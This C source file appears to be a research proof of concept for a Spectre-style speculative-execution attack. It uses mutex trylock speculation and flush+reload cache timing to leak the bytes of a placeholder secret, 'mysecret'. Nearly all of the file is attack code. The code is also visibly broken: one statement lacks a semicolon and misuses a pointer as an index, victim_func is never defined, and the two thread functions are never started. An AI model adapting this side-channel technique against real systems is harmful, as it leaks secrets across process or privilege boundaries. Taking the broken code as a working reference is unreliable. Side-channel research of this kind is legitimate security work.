#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 10
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define SECRET_SIZE 8
#define N_TRAINING 10
#define SECRET "mysecret"
#define false 0
#define true  1
#define DBG 0

#define FLAG PTHREAD_MUTEX_DEFAULT
//#define FLAG PTHREAD_MUTEX_ADAPTIVE_NP

cp_t* flush_reload_arr;
pthread_mutex_t k;

void* thread1(void* data) {

    char* allow_lock = (char*)data;

    if(*allow_lock) {
        pthread_mutex_lock(&k);
        sleep(1);
        pthread_mutex_unlock(&k);
    }

    return NULL;
}

void* thread2(void* data) {

    char* s = (char*)data;

    if(pthread_mutex_trylock(&k)) {
        flush_reload_arr[SECRET[s]]
        pthread_mutex_unlock(&k);
    }

    return NULL;
}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = N_TRAINING -(rand() % (N_TRAINING/2)) + 1;
    char lock_indices[n_accesses];
    char secret_indices[n_accesses];
    for(int i = 0; i < n_accesses; i++) {
        lock_indices[i] = 2;
        secret_indices[i] = 0;
    }
    lock_indices[n_accesses-1] = 0;
    secret_indices[n_accesses-1] = secret_index;
    cpuid();

    for(int i = 0; i < n_accesses; i++) {
        //if(DBG) printf("%d:\lock %d\tsecret %d\n", i, lock_indices[i], secret_indices[i]);
        victim_func(lock_indices[i], secret_indices[i]);
        cpuid();
        if(lock_indices[i] != 0) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    srand(time(0));
    pthread_mutex_init(&k, FLAG);
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    //results[0][0] = prepare(1);
    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);
    pthread_mutex_destroy(&k);
}